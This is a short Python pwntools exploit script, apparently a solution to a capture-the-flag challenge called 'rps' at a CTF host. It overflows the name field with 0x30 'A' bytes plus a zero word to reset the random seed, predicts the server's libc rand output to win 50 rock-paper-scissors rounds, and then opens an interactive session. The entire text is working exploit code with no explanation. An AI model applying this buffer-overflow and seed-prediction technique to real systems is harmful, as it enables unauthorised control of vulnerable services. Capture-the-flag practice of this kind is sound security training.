from pwn import *
import ctypes

libc = ctypes.cdll.LoadLibrary('libc.so.6')
libc.srand(0)
choice = ['R', 'P', 'S']

p = process('./rps')
p = remote('milkyway.chal.mmactf.link', 1641)

#p.recvuntil('name: ')
name = 'A' * 0x30 + p32(0)
p.sendline(name)
#p.recvuntil('Let\'s janken\n')

for i in xrange(50):
    #print p.recvuntil('[RPS]')
    c = libc.rand() % 3
    c = (c + 1) % 3
    p.sendline(choice[c])

p.interactive()




